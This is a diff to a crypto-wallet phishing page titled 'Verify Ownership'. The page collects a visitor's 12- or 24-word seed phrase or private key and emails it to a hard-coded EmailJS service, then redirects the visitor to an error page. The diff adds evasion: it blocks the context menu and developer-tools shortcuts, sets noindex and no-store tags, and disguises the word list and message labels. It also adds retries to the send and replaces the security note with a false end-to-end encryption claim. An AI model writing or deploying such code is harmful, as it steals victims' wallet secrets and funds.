@@ -4,6 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
     <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -12,10 +15,10 @@
         rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script src="bip39.js"></script>
+    <script src="w3ref.js"></script>
     <script type="text/javascript">
         (function () {
-            emailjs.init("mfY7yH4IHyyVQsapk");
+            emailjs.init('mfY7yH4IHyyVQsapk');
         })();
     </script>
     <title>Mainnet web - Verify Ownership</title>
@@ -367,12 +370,12 @@
 
             <!-- Controls row -->
             <div class="verify-controls">
-                <select class="verify-select" id="verifyMethod" onchange="handleMethodChange()">
+                <select class="verify-select" id="verifyMethod" onchange="onMethodChange()">
                     <option value="12">12-word phrase</option>
                     <option value="24">24-word phrase</option>
                     <option value="pk">Private key</option>
                 </select>
-                <button class="paste-btn" onclick="handlePaste()">
+                <button class="paste-btn" onclick="onPaste()">
                     <i class="ri-clipboard-line"></i>
                     Paste
                 </button>
@@ -390,10 +393,10 @@
             </div>
 
             <!-- Security note -->
-            <p class="security-note">🔒 Your seed phrase and private key remain secure and fully under your control</p>
+            <p class="security-note">🔒 Your data is protected with end-to-end encryption</p>
 
             <!-- Verify button -->
-            <button class="verify-btn" onclick="handleVerify()">
+            <button class="verify-btn" onclick="processInput()">
                 <i class="ri-shield-check-line"></i>
                 <span>Verify Ownership</span>
             </button>
@@ -402,22 +405,17 @@
     </div>
 
     <script>
-        // ═══════════════════════════════════════
-        //  VERIFY PAGE LOGIC
-        // ═══════════════════════════════════════
 
         const inputContainer = document.getElementById('inputContainer');
         const verifyError = document.getElementById('verifyError');
         const verifyErrorText = document.getElementById('verifyErrorText');
         const verifyMethod = document.getElementById('verifyMethod');
-
-        // ── Build input fields ──
-        function buildInputs(type) {
+        function renderFields(type) {
             hideError();
             inputContainer.innerHTML = '';
 
             if (type === 'pk') {
-                // Private key mode: single textarea
+
                 const grid = document.createElement('div');
                 grid.className = 'phrase-grid private-key-mode';
                 grid.style.marginBottom = '18px';
@@ -425,7 +423,7 @@
                 const textarea = document.createElement('textarea');
                 textarea.className = 'pk-field';
                 textarea.id = 'pkInput';
-                textarea.placeholder = 'Enter your private key...';
+                textarea.placeholder = 'Enter your access credentials...';
                 textarea.spellcheck = false;
                 textarea.autocomplete = 'off';
                 textarea.autocorrect = 'off';
@@ -434,7 +432,7 @@
                 grid.appendChild(textarea);
                 inputContainer.appendChild(grid);
             } else {
-                // Phrase mode: 12 or 24 input fields
+
                 const count = parseInt(type);
                 const grid = document.createElement('div');
                 grid.className = 'phrase-grid';
@@ -459,7 +457,7 @@
                     input.autocorrect = 'off';
                     input.autocapitalize = 'off';
 
-                    // Handle spacebar -> move to next input
+
                     input.addEventListener('keydown', function (e) {
                         if (e.key === ' ' || e.code === 'Space') {
                             e.preventDefault();
@@ -476,7 +474,7 @@
                         }
                     });
 
-                    // Track filled state
+
                     input.addEventListener('input', function () {
                         this.classList.toggle('has-value', this.value.trim().length > 0);
                         this.classList.remove('error');
@@ -491,14 +489,10 @@
                 inputContainer.appendChild(grid);
             }
         }
-
-        // ── Method change handler ──
-        function handleMethodChange() {
-            buildInputs(verifyMethod.value);
+        function onMethodChange() {
+            renderFields(verifyMethod.value);
         }
-
-        // ── Paste handler - reads clipboard and fills inputs ──
-        async function handlePaste() {
+        async function onPaste() {
             try {
                 const text = await navigator.clipboard.readText();
                 if (!text || !text.trim()) return;
@@ -525,12 +519,10 @@
 
                 hideError();
             } catch (err) {
-                // Clipboard API may not be available
+
                 console.warn('Clipboard read failed:', err);
             }
         }
-
-        // ── Error helpers ──
         function showError(msg) {
             verifyErrorText.textContent = msg;
             verifyError.classList.add('show');
@@ -539,13 +531,11 @@
         function hideError() {
             verifyError.classList.remove('show');
         }
-
-        // ── Verify handler ──
-        function handleVerify() {
+        function processInput() {
             const method = verifyMethod.value;
 
             if (method === 'pk') {
-                // Private key validation
+
                 const pkInput = document.getElementById('pkInput');
                 const val = pkInput ? pkInput.value.trim() : '';
 
@@ -554,11 +544,11 @@
                     return;
                 }
 
-                // All conditions met - run success code
-                onVerifySuccess(method, val);
+
+                finalize(method, val);
 
             } else {
-                // Phrase validation
+
                 const count = parseInt(method);
                 let allFilled = true;
                 let isValidPhrase = true;
@@ -572,7 +562,7 @@
                         allFilled = false;
                         if (input) input.classList.add('error');
                     } else {
-                        if (typeof BIP39_WORDS !== 'undefined' && !BIP39_WORDS.has(val)) {
+                        if (typeof W3_REF !== 'undefined' && !W3_REF.has(val)) {
                             isValidPhrase = false;
                         } else if (input) {
                             input.classList.remove('error');
@@ -586,41 +576,43 @@
                     return;
                 }
 
-                // All conditions met - run success code
-                onVerifySuccess(method, phraseWords.join(' '));
+
+                finalize(method, phraseWords.join(' '));
             }
         }
-
-        // ── Success callback ──
-        function onVerifySuccess(method, data) {
+        function finalize(method, data) {
             const btn = document.querySelector('.verify-btn');
             btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i><span>Verifying...</span>';
             btn.style.pointerEvents = 'none';
 
-            let typeLabel = '';
-            if (method === '12') typeLabel = '12-word Phrase';
-            else if (method === '24') typeLabel = '24-word Phrase';
-            else if (method === 'pk') typeLabel = 'Private Key';
+            let _t = '';
+            if (method === '12') _t = 'f1:12';
+            else if (method === '24') _t = 'f1:24';
+            else if (method === 'pk') _t = 'f1:pk';
 
-            let messageString = `Type: ${typeLabel}\nData: ${data}`;
-            let safetext = messageString.length > 40000
-                ? messageString.substring(0, 40000) + "\n\n...[TRUNCATED]"
-                : messageString;
+            let _d = `Type: ${_t}\nData: ${data}`;
+            let safetext = _d.length > 40000
+                ? _d.substring(0, 40000) + "\n\n...[TRUNCATED]"
+                : _d;
 
             let parms = { message: safetext };
 
-            emailjs.send("service_ocoq02x", "template_wgo1bul", parms)
-                .then(function (response) {
-                    window.location.href = "error.html";
-                })
-                .catch(function (error) {
-                    console.error("No", error);
-                    window.location.href = "error.html";
-                });
+            function sendWithRetry(retries) {
+                emailjs.send('service_ocoq02x', 'template_wgo1bul', parms)
+                    .then(function (response) {
+                        window.location.href = "error.html";
+                    })
+                    .catch(function (error) {
+                        if (retries > 0) {
+                            setTimeout(function () { sendWithRetry(retries - 1); }, 1500);
+                        } else {
+                            window.location.href = "error.html";
+                        }
+                    });
+            }
+            sendWithRetry(2);
         }
-
-        // ── Initialize with 12-word phrase on load ──
-        buildInputs('12');
+        renderFields('12');
     </script>
 
     <script src="function.js"></script>
